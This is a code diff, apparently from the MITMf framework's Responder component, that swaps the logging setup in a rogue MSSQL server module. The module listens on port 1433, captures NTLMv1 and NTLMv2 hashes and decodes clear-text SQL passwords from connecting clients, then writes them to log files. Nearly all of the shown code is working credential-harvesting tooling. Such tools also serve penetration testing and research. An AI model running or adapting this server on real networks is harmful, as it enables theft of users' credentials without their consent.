@@ -2,25 +2,27 @@ import struct
 import logging
 import threading
 
+from core.logger import logger
 from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
 from MSSQLPackets import *
 from core.responder.common import *
 
-mitmf_logger = logging.getLogger("mitmf")
+formatter = logging.Formatter("%(asctime)s [MSSQLserver] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logger().setup_logger("MSSQLserver", formatter)
 
-class MSSQLServer():
+class MSSQLserver():
 
     def start(self, chal):
         global Challenge; Challenge = chal
 
         try:
-            mitmf_logger.debug("[MSSQLServer] online")
+            log.debug("online")
             server = ThreadingTCPServer(("0.0.0.0", 1433), MSSQL)
-            t = threading.Thread(name="MSSQLServer", target=server.serve_forever)
+            t = threading.Thread(name="MSSQLserver", target=server.serve_forever)
             t.setDaemon(True)
             t.start()
         except Exception as e:
-            mitmf_logger.error("[MSSQLServer] Error starting on port {}: {}".format(1433, e))
+            log.error("Error starting on port {}: {}".format(1433, e))
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
@@ -47,10 +49,10 @@ def ParseSQLHash(data,client):
         User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
         outfile = "./logs/responder/MSSQL-NTLMv1-Client-"+client+".txt"
         WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+Challenge, User+"::"+Domain)
-        mitmf_logger.info('[MSSQLServer] MsSQL NTLMv1 hash captured from :{}'.format(client))
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv1 User is :{}'.format(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv1 Domain is :{}'.format(Domain))
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv1 Complete hash is: {}'.format(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+Challenge))
+        log.info('MsSQL NTLMv1 hash captured from :{}'.format(client))
+        log.info('MSSQL NTLMv1 User is :{}'.format(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
+        log.info('MSSQL NTLMv1 Domain is :{}'.format(Domain))
+        log.info('MSSQL NTLMv1 Complete hash is: {}'.format(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+Challenge))
     if NthashLen > 60:
         DomainLen = struct.unpack('<H',data[36:38])[0]
         NthashOffset = struct.unpack('<H',data[32:34])[0]
@@ -64,10 +66,10 @@ def ParseSQLHash(data,client):
         outfile = "./logs/responder/MSSQL-NTLMv2-Client-"+client+".txt"
         Writehash = User+"::"+Domain+":"+Challenge+":"+Hash[:32].upper()+":"+Hash[32:].upper()
         WriteData(outfile,Writehash,User+"::"+Domain)
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv2 hash captured from {}'.format(client))
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv2 Domain is: {}'.format(Domain))
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv2 User is: {}'.format(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
-        mitmf_logger.info('[MSSQLServer] MSSQL NTLMv2 Complete Hash is: {}'.format(Writehash))
+        log.info('MSSQL NTLMv2 hash captured from {}'.format(client))
+        log.info('MSSQL NTLMv2 Domain is: {}'.format(Domain))
+        log.info('MSSQL NTLMv2 User is: {}'.format(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
+        log.info('MSSQL NTLMv2 Complete Hash is: {}'.format(Writehash))
 
 def ParseSqlClearTxtPwd(Pwd):
     Pwd = map(ord,Pwd.replace('\xa5',''))
@@ -86,7 +88,7 @@ def ParseClearTextSQLPass(Data,client):
     PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
     UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
     WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
-    mitmf_logger.info('[MSSQLServer] {} MSSQL Username: {} Password: {}'.format(client, UserName, PwdStr))
+    log.info('{} MSSQL Username: {} Password: {}'.format(client, UserName, PwdStr))
 
 def ParsePreLoginEncValue(Data):
     PacketLen = struct.unpack('>H',Data[2:4])[0]
